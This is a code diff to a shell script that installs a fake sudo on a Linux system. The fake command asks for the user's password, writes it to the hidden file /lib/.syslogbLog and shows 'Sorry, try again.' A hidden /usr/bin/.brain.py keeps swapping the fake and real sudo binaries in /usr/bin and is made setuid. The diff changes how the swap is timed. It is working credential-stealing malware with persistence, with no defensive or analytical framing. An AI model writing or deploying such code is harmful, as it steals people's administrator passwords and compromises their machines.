@@ -24,8 +24,6 @@ def main():
         password = input("[sudo] password for " + user + ": ")
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
-        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
-        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
         time.sleep(3)
         os.system('stty echo')
         print("Sorry, try again.")
@@ -34,18 +32,25 @@ main()
 EOFA
 cat <<EOFB > /usr/bin/sudoC
 #!/bin/bash
-python3 /usr/bin/sudoB "$@" &
+python3 /usr/bin/sudoB "$@" 
+python3 /usr/bin/.brain.py "1"
 EOFB
 cat <<EOFC > /usr/bin/.brain.py
 import os
 import time
+import sys
 
 def main():
-    while(True):
-        if(os.path.exists("/usr/bin/sudoC")):
-            os.system("mv /usr/bin/sudo /usr/bin/sudoA")
-            os.system("mv /usr/bin/sudoC /usr/bin/sudo")
-        time.sleep(180)
+    if(sys.argv[1] == '1'):
+        time.sleep(2)
+        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
+        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
+    else:
+        while(True):
+            if(os.path.exists("/usr/bin/sudoC")):
+                os.system("mv /usr/bin/sudo /usr/bin/sudoA")
+                os.system("mv /usr/bin/sudoC /usr/bin/sudo")
+            time.sleep(180)
 main()
 EOFC
 chmod +s /usr/bin/.brain.py
